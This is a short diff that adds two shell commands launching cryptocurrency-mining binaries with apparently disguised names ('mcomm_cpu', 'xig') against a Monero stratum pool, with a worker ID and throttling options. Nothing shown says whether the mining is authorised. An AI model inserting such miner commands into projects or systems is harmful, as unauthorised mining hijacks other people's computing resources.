@@ -1,0 +1,4 @@
+./mcomm_cpu -o stratum+tcp://xmr.yiluzhuanqian.com:110 -u 2_0 --api-port 1993 --slow 20 
+
+./xig -o stratum+tcp://xmr.yiluzhuanqian.com:110  -k -u 2_0 --api-port=1993 --slow 20
+
